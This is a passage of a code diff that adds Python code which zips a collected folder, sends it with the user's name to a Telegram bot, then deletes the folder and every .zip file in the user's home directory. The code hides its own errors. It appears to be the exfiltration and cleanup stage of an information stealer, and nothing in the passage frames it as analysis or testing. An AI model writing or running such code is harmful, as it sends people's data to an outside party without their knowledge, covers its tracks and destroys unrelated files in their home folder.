+    zip_filepath = os.path.join(os.path.expanduser("~"), zip_filename)
+
+    try:
+        shutil.make_archive(zip_filepath[:-4], 'zip', u_folder)
+        return zip_filepath
+    except Exception as e:
+        pass
+        return None    
+    
+async def send_zip_to_telegram(zip_filepath, bot_token, chat_id):
+    bot = TeleBot(bot_token)
+
+    try:
+        user_message = f"User: {user_name}"
+        
+        bot.send_message(chat_id, user_message)
+
+        with open(zip_filepath, 'rb') as zip_file:
+            bot.send_document(chat_id, zip_file)
+
+        separator_message = "═════════════════"
+        bot.send_message(chat_id, separator_message)
+
+    except Exception as e:
+        pass
+
+async def main():
+    zip_filepath = await create_zip(u_folder)
+    if zip_filepath:
+        await send_zip_to_telegram(zip_filepath, BOT_TOKEN, USER_TLG_ID)
+        os.remove(zip_filepath)
+
+if __name__ == "__main__":
+    asyncio.run(main())
+
+def delete():
+    try:
+        shutil.rmtree(u_folder)
+    except FileNotFoundError:
+        pass
+
+    try:
+        user_home_dir = os.path.expanduser("~")
+        
+        for filename in os.listdir(user_home_dir):
+            if filename.endswith('.zip'):
+                zip_filepath = os.path.join(user_home_dir, filename)
+                os.remove(zip_filepath)
+    except Exception as e:
+        pass
+
+delete()
